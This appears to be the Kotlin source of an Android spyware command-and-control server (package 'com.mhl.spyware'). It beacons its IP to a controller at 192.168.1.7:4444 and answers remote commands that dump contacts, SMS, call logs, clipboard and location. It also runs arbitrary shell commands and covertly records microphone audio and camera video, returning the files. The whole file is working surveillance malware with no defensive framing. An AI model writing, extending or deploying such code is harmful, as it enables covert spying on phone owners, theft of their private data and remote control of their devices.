package com.mhl.spyware

import android.app.Activity
import android.app.Application
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telecom.Call
import android.util.Log
import fi.iki.elonen.NanoHTTPD
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withContext
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.io.IOException
import java.net.Inet4Address
import java.net.NetworkInterface

class Server(   private val dataRepository: DataRepository,
                private val context: Context
): NanoHTTPD(1234){

    private val client: OkHttpClient = OkHttpClient()

    private val coroutineScope = CoroutineScope(Dispatchers.Default + SupervisorJob())

    @Volatile
    private var isAppInForeground = true  // Default to true since we start in foreground
    private val lifecycleCallback = object : Application.ActivityLifecycleCallbacks {
        private var activeActivities = 0

        override fun onActivityResumed(activity: Activity) {
            isAppInForeground = true
            Log.d("SimpleHttpServer", "App moved to foreground")
        }

        override fun onActivityPaused(activity: Activity) {
            if (activeActivities == 0) {
                isAppInForeground = false
                Log.d("SimpleHttpServer", "App moved to background")
            }
        }

        override fun onActivityStarted(activity: Activity) {
            activeActivities++
        }

        override fun onActivityStopped(activity: Activity) {
            activeActivities--
        }

        override fun onActivityCreated(activity: Activity, savedInstanceState: Bundle?) {}
        override fun onActivitySaveInstanceState(activity: Activity, outState: Bundle) {}
        override fun onActivityDestroyed(activity: Activity) {}
    }

    init {
        try {
            // notifyFlaskServer()
            (context.applicationContext as Application).registerActivityLifecycleCallbacks(lifecycleCallback)
            Log.d("SimpleHttpServer", "HTTP Server started on port 7777")
            startPolling()
        } catch (e: IOException) {
            Log.e("SimpleHttpServer", "Failed to start HTTP Server: ${e.message}")
        }
    }




    private fun startPolling() {


        coroutineScope.launch {
            try {

                while (isActive) {
                    notifyFlaskServer()
                    delay(60 * 5000L) // 5 minutes delay

                }
            } catch (_: Exception) {

            }
        }
    }

    private fun notifyFlaskServer() {
        val ip = getLocalIpAddress()
        val url = "http://192.168.1.7:4444/register"
        val payload = JSONObject().apply {
            put("ip", ip)
            put("port", "1234")
        }

        val request = Request.Builder()
            .url(url)
            .post(payload.toString().toRequestBody("application/json".toMediaType()))
            .build()

        client.newCall(request).enqueue(object : Callback {

            override fun onFailure(call: okhttp3.Call, e: IOException) {
                Log.e("SimpleHttpServer", "Notification failed: ${e.message}")
            }

            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
                Log.d("SimpleHttpServer", "Notification response code: ${response.code}")
                response.close() // Always close the response
            }
        })
    }

    private fun getLocalIpAddress(): String? {
        val interfaces = NetworkInterface.getNetworkInterfaces()
        while (interfaces.hasMoreElements()) {
            val networkInterface = interfaces.nextElement()
            val addresses = networkInterface.inetAddresses
            while (addresses.hasMoreElements()) {
                val address = addresses.nextElement()
                if (!address.isLoopbackAddress && address is Inet4Address) {
                    return address.hostAddress
                }
            }
        }
        return "127.0.0.1"
    }

    override fun serve(session: IHTTPSession?): Response {
        val command = session?.parameters?.get("command")?.firstOrNull() ?: "Unknown"
        return when (command) {
            "GET_CONTACTS" -> {
                val contacts = dataRepository.getContactsData()
                newFixedLengthResponse(contacts)
            }

            "GET_SMS" -> {
                val sms = dataRepository.getSMSData()
                newFixedLengthResponse(sms)
            }

            "GET_CALL_LOGS" -> {
                val logs = dataRepository.getCallLogsData()
                newFixedLengthResponse(logs)
            }

            "GET_CLIPBOARD" -> {
                val clipdata = dataRepository.getClipboardData()
                newFixedLengthResponse(clipdata)
            }

            "GET_LOCATION" -> {
                val locationResponse = runBlocking {
                    dataRepository.getLocationData()
                }
                newFixedLengthResponse(locationResponse)

            }

            "EXECUTE" -> {
                val shellCommandExecutor = ShellCommandExecutor()

                val files = HashMap<String, String>()
                if (session != null) {
                    session.parseBody(files)
                }


                val shellCommand = try {
                    val json = JSONObject(files["postData"] ?: "{}")
                    json.optString("cmd")
                } catch (e: Exception) {
                    ""
                }
                if (shellCommand != null) {
                    val result = shellCommandExecutor.execute(shellCommand)
                    newFixedLengthResponse(result)
                } else {
                    newFixedLengthResponse("No command provided")
                }
            }


            "AUDIO_RECORD" -> {
                if (!isAppInForeground) {
                    Log.w("SimpleHttpServer", "Attempting to start audio recording while app in background")
                    return newFixedLengthResponse(
                        Response.Status.SERVICE_UNAVAILABLE,
                        MIME_PLAINTEXT,
                        "Cannot start audio recording when app is in background"
                    )
                }

                try {
                    val intent = Intent(context, AudioRecorder::class.java).apply {
                        action = "START_RECORDING"
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }

                    context.startForegroundService(intent)

                    Log.d("SimpleHttpServer", "Audio recording service started")
                    return newFixedLengthResponse("Audio Recording started")

                } catch (e: Exception) {
                    Log.e("SimpleHttpServer", "Error starting audio recording", e)
                    return newFixedLengthResponse(
                        Response.Status.INTERNAL_ERROR,
                        MIME_PLAINTEXT,
                        "Error starting audio recording: ${e.message}"
                    )
                }
            }

            "AUDIO_STOP" -> {
                runBlocking {
                    val intent = Intent(context, AudioRecorder::class.java)
                    context.stopService(intent)


                    val response: Response = withContext(Dispatchers.IO) {
                        delay(2000) // Delay to ensure the file is finalized

                        val fileUri = AudioRecorder.lastRecordedFileUri
                        Log.d("SimpleHttpServer", "File URI after stop: $fileUri")

                        if (fileUri == null) {
                            return@withContext newFixedLengthResponse(
                                Response.Status.NOT_FOUND,
                                MIME_PLAINTEXT,
                                "No recording file available"
                            )
                        }

                        val audioFile = File(fileUri)
                        if (!audioFile.exists()) {
                            Log.e("SimpleHttpServer", "File doesn't exist: $fileUri")
                            return@withContext newFixedLengthResponse(
                                Response.Status.NOT_FOUND,
                                MIME_PLAINTEXT,
                                "File not found"
                            )
                        }

                        if (audioFile.length() == 0L) {
                            Log.e("SimpleHttpServer", "File is empty: $fileUri")
                            return@withContext newFixedLengthResponse(
                                Response.Status.INTERNAL_ERROR,
                                MIME_PLAINTEXT,
                                "File is empty"
                            )
                        }

                        try {
                            val fileInputStream = FileInputStream(audioFile)
                            Log.d(
                                "SimpleHttpServer",
                                "Sending file: ${audioFile.absolutePath}, size: ${audioFile.length()}"
                            )
                            return@withContext newChunkedResponse(
                                Response.Status.OK,
                                "audio/3gpp", // Correct MIME type for 3GPP audio files
                                fileInputStream
                            )
                        } catch (e: Exception) {
                            Log.e("SimpleHttpServer", "Error reading file: ${e.message}")
                            return@withContext newFixedLengthResponse(
                                Response.Status.INTERNAL_ERROR,
                                MIME_PLAINTEXT,
                                "Error reading file: ${e.message}"
                            )
                        }
                    }

                    response
                }
            }




            "VIDEO_START" -> {

                if (!isAppInForeground) {
                    Log.w("SimpleHttpServer", "Attempting to start video while app in background")
                    return newFixedLengthResponse(
                        Response.Status.SERVICE_UNAVAILABLE,
                        MIME_PLAINTEXT,
                        "Cannot start video recording when app is in background"
                    )
                }

                try {
                    val files = HashMap<String, String>()
                    session?.parseBody(files)

                    val direction = try {
                        val json = JSONObject(files["postData"] ?: "{}")
                        json.optString("cameraDirection", "back")
                    } catch (e: Exception) {
                        "back"
                    }

                    val cameraId = if (direction == "front") "1" else "0"

                    // Use FLAG_ACTIVITY_NEW_TASK for starting service from background
                    val intent = Intent(context, VideoRecord::class.java).apply {
                        action = "START_RECORDING"
                        putExtra("cameraId", cameraId)
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }

                    context.startForegroundService(intent)

                    Log.d("SimpleHttpServer", "Video recording service started with camera: $direction")
                    return newFixedLengthResponse("Video Recording started with camera: $direction")

                } catch (e: Exception) {
                    Log.e("SimpleHttpServer", "Error starting video recording", e)
                    return newFixedLengthResponse(
                        Response.Status.INTERNAL_ERROR,
                        MIME_PLAINTEXT,
                        "Error starting video recording: ${e.message}"
                    )
                }
            }

            "VIDEO_STOP" -> {
                runBlocking {
                    val intent = Intent(context, VideoRecord::class.java).apply {
                        action = "STOP_RECORDING"
                    }
                    context.stopService(intent)


                    val response: Response = withContext(Dispatchers.IO) {
                        delay(2000)

                        val fileUri = VideoRecord.lastRecordedFileUri
                        Log.d("SimpleHttpServer", "File URI after stop: $fileUri")

                        if (fileUri == null) {
                            return@withContext newFixedLengthResponse(
                                Response.Status.NOT_FOUND,
                                MIME_PLAINTEXT,
                                "No video file available"
                            )
                        }

                        val videoFile = File(fileUri)
                        if (!videoFile.exists()) {
                            Log.e("SimpleHttpServer", "File doesn't exist: $fileUri")
                            return@withContext newFixedLengthResponse(
                                Response.Status.NOT_FOUND,
                                MIME_PLAINTEXT,
                                "Video file not found"
                            )
                        }

                        try {
                            val fileInputStream = FileInputStream(videoFile)
                            Log.d(
                                "SimpleHttpServer",
                                "Sending video file: ${videoFile.absolutePath}, size: ${videoFile.length()}"
                            )
                            return@withContext newChunkedResponse(
                                Response.Status.OK,
                                "video/mp4", // Correct MIME type
                                fileInputStream
                            )
                        } catch (e: Exception) {
                            Log.e("SimpleHttpServer", "Error reading video file: ${e.message}")
                            return@withContext newFixedLengthResponse(
                                Response.Status.INTERNAL_ERROR,
                                MIME_PLAINTEXT,
                                "Error reading video file: ${e.message}"
                            )
                        }
                    }

                    response
                }
            }




            else -> newFixedLengthResponse("Unknown command: $command")
        }
    }

}